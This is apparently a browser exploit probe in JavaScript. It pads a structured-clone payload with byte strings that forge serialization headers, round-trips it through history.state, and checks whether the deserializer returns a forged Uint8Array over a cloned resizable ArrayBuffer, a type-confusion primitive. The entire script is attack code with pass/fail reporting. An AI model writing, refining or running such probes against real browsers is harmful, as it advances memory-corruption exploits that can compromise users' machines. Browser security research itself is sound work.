// First verify that pool index 0x8000 is the cloned RAB. Then try to read an
// ArrayBufferViewTag from a separate 8-bit StringData header. No view access.
function payloadFor(mode) {
  if (mode === "reference") {
    var ref = "\u0000\u0080" + "\u00ff".repeat(8);
    return ref + "A".repeat(0x1300 - ref.length);
  }
  var bytes = "\u0000".repeat(7) + "\u0008" + "\u0000".repeat(7) +
    "\u0013\u0000\u0080" + "\u00ff".repeat(8);
  return bytes + "A".repeat(0x21600 - bytes.length);
}
function run(id, mode) {
  var phase = "build";
  var result;
  try {
    var backing = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(backing).fill(0x41);
    var filler = new Array(0xfffd);
    filler[0] = BigInt(1) << BigInt(40);
    for (var i = 1; i < filler.length; i++) filler[i] = {};
    filler[32766] = backing;
    var shared = { marker: 0x51515151 };
    var input = new Array(0x10001);
    input[0] = filler;
    input[1] = shared;
    input[2] = shared;
    input[0x10000] = payloadFor(mode);
    if (api && typeof api.markSync === "function") api.markSync("rab_" + mode + "_ready");
    phase = "store";
    history.replaceState(input, "");
    phase = "load";
    var output = history.state;
    if (api && typeof api.markSync === "function") api.markSync("rab_" + mode + "_loaded");
    phase = "inspect";
    var target = output[0] && output[0][32766];
    var inserted = output[0x100001];
    var isView = inserted instanceof Uint8Array;
    var isTarget = mode === "reference" ? inserted === target : isView && inserted.buffer === target;
    var expected = isTarget && target instanceof ArrayBuffer && target.resizable === true &&
      target.maxByteLength === 16 && new Uint8Array(target)[0] === 0x41;
    result = { id: id, status: expected ? "pass" : "fail", details: {
      output_length: output.length,
      inserted_is_target: isTarget,
      inserted_is_u8: isView,
      view_offset: isView ? inserted.byteOffset : null,
      view_byte_length: isView ? inserted.byteLength : null,
      target_resizable: target instanceof ArrayBuffer && target.resizable === true,
      target_max: target instanceof ArrayBuffer ? target.maxByteLength : null,
      target_canary: target instanceof ArrayBuffer ? new Uint8Array(target)[0] : null
    } };
  } catch (error) {
    result = { id: id, status: "error", details: {
      phase: phase, error: String(error).slice(0, 200)
    } };
  }
  try { history.replaceState(null, ""); result.details.cleanup_ok = true; }
  catch (error) { result.status = "error"; result.details.cleanup_ok = false; }
  return result;
}
var reference = run("rab_reference_control", "reference");
if (reference.status !== "pass")
  return [reference, { id: "rab_synthetic_u8_case", status: "unsupported", details: { reason: "reference_control_failed" } }];
return [reference, run("rab_synthetic_u8_case", "synthetic")];
